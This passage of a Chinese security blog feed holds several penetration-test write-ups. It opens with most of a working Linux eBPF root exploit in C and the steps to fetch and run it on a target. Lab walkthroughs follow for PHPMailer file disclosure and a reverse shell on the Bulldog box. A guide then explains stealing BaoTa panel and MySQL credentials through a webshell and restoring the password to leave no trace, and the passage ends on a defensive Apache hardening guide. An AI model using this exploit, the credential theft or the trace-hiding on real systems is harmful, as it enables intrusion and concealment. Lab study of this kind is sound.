class="line">bpf_log_buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="keyword">int</span> key_size, <span class="keyword">int</span> value_size,</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="keyword">int</span> max_entries)</span> </span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.map_type = map_type,</span><br><span class="line">.key_size = key_size,</span><br><span class="line">.value_size = value_size,</span><br><span class="line">.max_entries = max_entries</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">uint64_t</span> key, <span class="keyword">uint64_t</span> value)</span> </span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.map_fd = mapfd,</span><br><span class="line">.key = (__u64)&amp;key,</span><br><span class="line">.value = (__u64)&amp;value,</span><br><span class="line">.flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_lookup_elem</span><span class="params">(<span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span> </span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.map_fd = mapfd,</span><br><span class="line">.key = (__u64)key,</span><br><span class="line">.value = (__u64)value,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit(<span class="keyword">char</span> *err) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;error: %s\n&quot;</span>, err);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prep</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>), <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span> (mapfd &lt; <span class="number">0</span>)</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">(struct bpf_insn *)__prog, PROGSIZE, <span class="string">&quot;GPL&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (progfd &lt; <span class="number">0</span>)</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets))</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) &lt; <span class="number">0</span>)</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> n = write(sockets[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (n != <span class="keyword">sizeof</span>(buffer))</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write: %lu\n&quot;</span>, n);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __update_elem(a, b, c) \</span></span><br><span class="line">bpf_update_elem(<span class="number">0</span>, (a)); \</span><br><span class="line">bpf_update_elem(<span class="number">1</span>, (b)); \</span><br><span class="line">bpf_update_elem(<span class="number">2</span>, (c)); \</span><br><span class="line">writemsg();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_value</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">uint64_t</span> value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf_lookup_elem(&amp;key, &amp;value))</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __get_fp(<span class="keyword">void</span>) &#123;</span><br><span class="line">__update_elem(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __read(<span class="keyword">uint64_t</span> addr) &#123;</span><br><span class="line">__update_elem(<span class="number">0</span>, addr, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __write(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> val) &#123;</span><br><span class="line">__update_elem(<span class="number">2</span>, addr, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_sp</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> addr &amp; ~(<span class="number">0x4000</span> - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pwn</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">uint64_t</span> fp, sp, task_struct, credptr, uidptr;</span><br><span class="line"></span><br><span class="line">fp = __get_fp();</span><br><span class="line"><span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus fp&quot;</span>);</span><br><span class="line"></span><br><span class="line">sp = get_sp(fp);</span><br><span class="line"><span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus sp&quot;</span>);</span><br><span class="line"></span><br><span class="line">task_struct = __read(sp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus task ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;task_struct = %lx\n&quot;</span>, task_struct);</span><br><span class="line"></span><br><span class="line">credptr = __read(task_struct + CRED_OFFSET); <span class="comment">// cred</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus cred ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">uidptr = credptr + UID_OFFSET; <span class="comment">// uid</span></span><br><span class="line"><span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus uid ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;uidptr = %lx\n&quot;</span>, uidptr);</span><br><span class="line">__write(uidptr, <span class="number">0</span>); <span class="comment">// set both uid and gid to 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;spawning root shell\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__exit(<span class="string">&quot;not vulnerable?&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">prep();</span><br><span class="line">pwn();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>4.在此文件目录下执行python -m SimpleHTTPServer 80,将当前目录发布到80端口</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003610.png"></p><p>5.在登录ssh命令行下执行wget <a href="http://172.16.11.29/upstream44.c%EF%BC%8C%E5%85%B6%E4%B8%AD172.16.11.29%E4%B8%BA%E6%94%BB%E5%87%BB%E6%9C%BA">http://172.16.11.29/upstream44.c，其中172.16.11.29为攻击机</a></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003615.png"></p><p>6.使用gcc编译成可执行文件，gcc -o upstream upstream44.c</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003622.png"></p><p>7.运行upstream后获得root权限，在/root目录发现flag5</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003627.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 主机渗透 </tag>
            
            <tag> 靶机渗透 </tag>
            
            <tag> WordPress </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透实战之PHPMAILER</title>
      <link href="post/d39d242e.html"/>
      <url>post/d39d242e.html</url>
      
        <content type="html"><![CDATA[<h1 id="靶机渗透实战-PHPMAILER"><a href="#靶机渗透实战-PHPMAILER" class="headerlink" title="靶机渗透实战-PHPMAILER"></a>靶机渗透实战-PHPMAILER</h1><p>（1）端口扫描</p><p>运行命令“nmap –sS -n 192.168.7.14”扫描目标IP开放的端口。靶机开放smtp、imap等端口，并使用80和8000 端口提供http服务，推测靶机为邮件服务器。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003639.png"></p><p>（2）在浏览器中访问靶机的80端口，发现是一个用户反馈页面。</p><p>   <img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003651.png"></p><p>（3）使用dirbuster扫描80端口 ，字典使用dirbuster安装目录下的文件，无需额外的字典，配置如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003656.png"></p><p>扫描结果如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003711.png"></p><p>打开flag.php页面，发现为空白，推测得到flag需要获取源代码。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003722.png"></p><p>打开secret页面，发现为空白，查看源码，发现隐藏元素，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003729.png"></p><p>其中account变量和pass变量字符串仅含数字和abcd等字符猜测为16进制编码，使用xxd命令解码，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003814.png"></p><p>打开8000端口，是一个邮件服务器的登录页面。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003821.png"></p><p>找到的用户名<a href="mailto:&#x63;&#x75;&#x73;&#116;&#x6f;&#109;&#101;&#x72;&#x40;&#120;&#x78;&#x78;&#x2e;&#x63;&#111;&#109;">&#x63;&#x75;&#x73;&#116;&#x6f;&#109;&#101;&#x72;&#x40;&#120;&#x78;&#x78;&#x2e;&#x63;&#111;&#109;</a>和密码1qaz2wsx3edc登录，可以登录。<img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003846.png"></p><p>发现其中邮件内容，尝试使用base64解码，发现为一个路径，猜测为flag地址。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003852.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003858.png"></p><p>打开用户反馈页面，输入指定邮箱<a href="mailto:&#99;&#117;&#115;&#x74;&#111;&#x6d;&#101;&#114;&#x40;&#120;&#x78;&#120;&#x2e;&#99;&#x6f;&#109;">&#99;&#117;&#115;&#x74;&#111;&#x6d;&#101;&#114;&#x40;&#120;&#x78;&#120;&#x2e;&#99;&#x6f;&#109;</a>，输入一定反馈信息，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003906.png"></p><p>点击submit按钮提交反馈信息，返回了success信息，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003906.png" alt="image-20210301203859387"></p><p>登录邮箱查看邮件信息，发现收到一条新的邮件，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003918.png"></p><p>phpmailer小于5.2.17的版本存在任意文件读取漏洞，通过精心构造payload，可以读取服务器上任意拥有权限的文件，尝试通过phpmailer的漏洞读取flag.php文件。尝试构造如下反馈，查看网页标签等内容是否被过滤。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003927.png"></p><p>打开邮箱可以发现收到邮件中标签未被过滤，br标签换行成功。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003933.png"></p><p>尝试获取/etc/passwd文件，查看是否存在权限问题，构造如下的输入。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003946.png"></p><p>打开邮箱，如下图所示，可以发现确实收到了附件。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003951.png"></p><p>点击“Show Source”，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302004004.png"></p><p>在打开的页面中可以发现附件内容，如下图所示，可以看到附件文件名、编码格式、内容等信息。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302004010.png"></p><p>附件内容是经过了base64编码，将上述内容粘贴至文件b64中，通过base64命令进行解码，cat b64 | base64 -d 可以得到解密后字符串，可以发现正确返回了/etc/passwd文件。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302004023.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302004031.png"></p><p>通过与上述相同的步骤，根据前面得到的flag地址构造payload获取flag.php和flag.txt文件如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302004039.png"></p><p>可以得到两个flag，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302004106.png"></p><p>进行base64解码，如下图所示</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302004100.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 主机渗透 </tag>
            
            <tag> PHPMAILER </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透实战之Bulldog: 1</title>
      <link href="post/34232f11.html"/>
      <url>post/34232f11.html</url>
      
        <content type="html"><![CDATA[<h1 id="靶机渗透实战之Bulldog-1"><a href="#靶机渗透实战之Bulldog-1" class="headerlink" title="靶机渗透实战之Bulldog: 1"></a>靶机渗透实战之Bulldog: 1</h1><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>①、使用Nmap工具对靶机进行端口扫描，命令为 nmap –sS 192.168.7.166(靶机地址)。可以看到，开放了22、80、3389端口</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003025.png"></p><p>②、再次输入nmap指令[nmap –A –p80,22 192.168.7.166]查看80端口，22端口对应的服务。可以看到，22端口对应的ssh服务已开启。80端口对应的web服务器则是基于python环境的</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003031.png"></p><p>③、对目录进行扫描 dirb <a href="http://192.168.7.166,发现目录http//192.168.7.166/admin">http://192.168.7.166，发现目录http://192.168.7.166/admin</a></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003042.png"></p><p>④、访问admin目录，尝试了下弱口令发现不行</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003050.png"></p><p>⑤、访问下一个目录 <a href="http://192.168.7.166/dev%EF%BC%8C%E6%A3%80%E6%9F%A5%E9%A1%B5%E9%9D%A2%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89%E7%96%91%E4%BC%BC%E8%B4%A6%E6%88%B7%E5%90%8D%E5%92%8C%E7%BB%8F%E8%BF%87md5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84%E5%AF%86%E7%A0%81">http://192.168.7.166/dev，检查页面源代码，发现有疑似账户名和经过md5加密后的密码</a></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003103.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003111.png"></p><p>经过尝试发现search和对应的MD5加密后的密码可以登录系统</p><p>账户：sarah</p><p>密码：bulldoglover</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003119.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003127.png"></p><p>⑥、登录后发现没有什么有用得，于是继续查看其它目录，发现一个<a href="http://192.168.7.166/dev/shell/%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%8F%90%E7%A4%BA%E8%AF%B7%E5%90%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%AA%8C%E8%AF%81%E4%BB%A5%E4%BD%BF%E7%94%A8web">http://192.168.7.166/dev/shell/，发现提示请向服务器验证以使用web</a> shell</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003004.png"></p><p>于是想着前面的登录，看看登录后是否能访问</p><p>登录admin，发现能成功登录</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003137.png"></p><p>⑦、在攻击机下编写shell文件，将该目录发布到80端口：python -m SimpleHTTPServer 80，然后将该文件拷贝到开启python-web服务的根目录下</p><p>shell.py</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003145.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003207.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003216.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003221.png"></p><p>⑧、在攻击中输入nc -lvp 1234，对1234端口进行监听</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003226.png"></p><p>⑨、在shell界面执行shell文件，pwd&amp;python shell.py</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003232.png"></p><p>可以看见kali攻击机中监听成功连接到靶机</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003237.png"></p><p>⑩、在网站根目录下找到flag.txt,拿到flag1</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003245.png"></p><p>进入bulldogadmin目录，输入ls -al查看所有文件</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003254.png"></p><p>打开隐藏目录.hiddenadmindirectory,拿到第二个flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302003303.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 主机渗透 </tag>
            
            <tag> bulldog </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宝塔配置文件读取及提权</title>
      <link href="post/47171cdd.html"/>
      <url>post/47171cdd.html</url>
      
        <content type="html"><![CDATA[<h1 id="宝塔配置文件读取及提权"><a href="#宝塔配置文件读取及提权" class="headerlink" title="宝塔配置文件读取及提权"></a>宝塔配置文件读取及提权</h1><p>环境：如果所访问网站是在宝塔面板上搭建的</p><p>​           已经上传了PHP大马</p><p>​          可以跨目录</p><p>背景：权限足够，获取更高权限（例如命令执行权限）</p><p>注意：在获取权限后，注意将密码替换回去（后续会提到）</p><p>步骤：</p><p>1.如果该网站为宝塔面板搭建，那么其访问路径端口号多半是8888，例如我所搭建的网站<a href="http://www.cdclhh.com在其加上8888端口后,会如下图所示/">www.cdclhh.com在其加上8888端口后，会如下图所示</a></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302230425.png"></p><p>可以看到提示我们访问正常路径。</p><p>这时就需要用到我们已经上传的大马，在正常情况下，在宝塔的文件中会存在一个文件（BtSoft/panel/data/admin_path.pl）记录其宝塔正确登录地址</p><p>在大马上找到该文件位置打开，可以看见路径尾数</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302230431.png"></p><p>接着将其复制跟在域名后面，接着就来到了正确的登录界面</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302230438.png"></p><p>接着我们继续在该路径下，找寻记登录账号和密码的文件夹，一般来说为BtSoft/panel/data/default.db</p><p>即default.db这个文件，此数据库类型为sqllite</p><p>我们将这个.db文件下载下来，用sqllitestudio打开</p><p>找到users，点击可以看见账户密码</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302230447.png"></p><p>一般来说password加密为md5加密</p><p>将其密码去解下密，并未成功</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302230502.png"></p><p>这时我们可以自定义一个密码，然后md5加密</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302230508.png" alt="4"></p><p>将其加密后的密码写入default中，保存，然后将其通过大马上传到原目录文件下，此时我们就可以用123456这个密码登录成功了</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302230514.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302230526.png"></p><p>注意，我们此时已经修改了密码，所以当我们登录后需要将原密码改回，别留下足迹</p><h1 id="MYSQL-密码获取"><a href="#MYSQL-密码获取" class="headerlink" title="MYSQL 密码获取"></a>MYSQL 密码获取</h1><p>mysql密码获取，本次主要是为了mysql的一个提权应用，当然并不仅限于此</p><p>背景：宝塔下搭建的dedecms</p><p>​           已经上传大马和mysql.php提权小工具的情况下</p><p>​           允许目录可跨</p><p> 步骤</p><p>首先mysql的账户密码获取途径这是关键的一步，从网站源码中获取、从mysql数据文件中读取</p><p>其中mysql数据文件路径一般在C:/IE/BtSoft/mysql/MySQL5.6/data/mysql</p><p>下的user.myi和user.myd里面</p><p>基于此，我们去访问之前已经上传的大马</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302230538.png"></p><p>去找到该目录，并打开检查是否存在密码</p><p><img src="https://cdn.jsdelivr.net/gh/Lhang906/imgbed/images/20210302230544.png"></p><p>在user.MYD中发现了密码</p><p>可尝试通过md5尝试解密一下，此处就不做演示了（主要是安全意识太高，我这个密码解不出来）</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web攻击 </tag>
            
            <tag> 宝塔面板 </tag>
            
            <tag> mysql密码获取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows下Apache+MySQL降权</title>
      <link href="post/eeb62b3f.html"/>
      <url>post/eeb62b3f.html</url>
      
        <content type="html"><![CDATA[<p><strong>windows下Apache降权</strong></p><p>环境：Windows  server 2012</p><p>​           phpstudy2016</p><p>步骤</p><p>1.打开 phpstudy2018，其他选项菜单 –》服务管理器 –》Apache–》安装服务。运行模式选择系统服务，应用</p><p><img src="E:\云笔记\1320143699@qq.com\de04c80f2bbf4933a57b61b383ad45e9\4h6" alt="img">mr}p@8z%u4l9z%7drwl.png)</p><p>查看服务，当服务中有如图所示名称服务成功。</p><p><img src="E:\云笔记\1320143699@qq.com\99355b985781476ca7b15ec621d01981\m9kv@_c4]v1[a~~r@erb69d.png" alt="img"></p><p>如果不能通过 phpstudy 安装服务，可在 apache 安装目录下的 bin 执行命令安装：</p><p> httpd  -k install</p><p><img src="E:\云笔记\1320143699@qq.com\bb5e9e5d0d4c4ce39b52dcab6dbea422\clipboard.png" alt="img"></p><p>2.降权操作</p><p>①向web端上传一个PHP大马，测试权限，如图</p><p><img src="E:\云笔记\1320143699@qq.com\f3497219e89c4f82b0464988ad1f5e38\clipboard.png" alt="img"></p><p>一般来说以服务模式启动Apache权限为最高级system</p><p>为避免web端被入侵，并直接拥有system权限，于是创建一个普通的users用户组的账号来控制Apache服务</p><p>具体步骤： </p><p>​        ①新建一个名为Apache9密码为123456的用户</p><p>​          </p><p><img src="E:\云笔记\1320143699@qq.com\799989d3e78946fa9cd88335b8d31ed1\clipboard.png" alt="img"></p><p>②然后右键 apache 服务，属性，登录栏选择浏览用户，高级立即查找找到对应账号。然后注意下密码重新输入对应密码。应用</p><p><img src="E:\云笔记\1320143699@qq.com\e0b8938253e1429288041fed7d2fa6ae\clipboard.png" alt="img"></p><p>点击浏览选择我们此前所创建的账户</p><p><img src="E:\云笔记\1320143699@qq.com\f263557d3f9f437680053cbb829aad8a\ys$]_~4{yt5w`%k]tudywk9.png" alt="img"></p><p><img src="E:\云笔记\1320143699@qq.com\2311728847ef40e994b9487a2c85a0bf\mr4je[vg@fgo]772bpw5}5k.png" alt="img"></p><p><img src="E:\云笔记\1320143699@qq.com\da4a03423de443fbbb93f71ca4ef1e64\gz9kl[]~s8(r[ndcs9dxc]7.png" alt="img"></p><p><img src="E:\云笔记\1320143699@qq.com\db7dc65a1e214362ae71e2368b27207a\clipboard.png" alt="img"></p><p>应用之后重启</p><p>3.Apache服务不能正常启动</p><p>根据其报错，参看系统事件日志查看原因</p><p><img src="E:\云笔记\1320143699@qq.com\55c956db20644690af6beaa9bd804516\clipboard.png" alt="img"></p><p><img src="E:\云笔记\1320143699@qq.com\b8e149e74c8c41e8b18f30b9502bca70(@m2}swo}8mu9[wdx9%lp4o.png" alt="img"></p><p>发现有两个错误，分别为不能打开log文件和不能打开logs</p><p><img src="E:\云笔记\1320143699@qq.com\33862f233a2544aaa76c5a833c9cb448\clipboard.png" alt="img"></p><p><img src="E:\云笔记\1320143699@qq.com\796c9fe5c1814afea840340256a59c6c\clipboard.png" alt="img"></p><p>根据错误提示，估计就是权限问题，找到该文件位置，对其权限管理分配给Apache完整的权限</p><p>首先对error.log属性，安全，增加apache用户权限</p><p><img src="E:\云笔记\1320143699@qq.com\273912f72bdb42359d49ab6ca7306f3f\clipboard.png" alt="img"></p><p><img src="E:\云笔记\1320143699@qq.com\2fc22755b6824e37bac92dd37ecb6c9b\clipboard.png" alt="img"></p><p>最后在任务管理器中可查看到此时apache服务的用户为我们所创建的apache9的用户权限</p><p><img src="E:\云笔记\1320143699@qq.com\8a779d09cd6245fbaf93a1af270d0ea2\clipboard.png" alt="img"></p><p>再来测试下我们之前所上传的大马</p><p><img src="E:\云笔记\1320143699@qq.com\7a0e294dead74a50b4c4ddac4fdd5caf\clipboard.png" 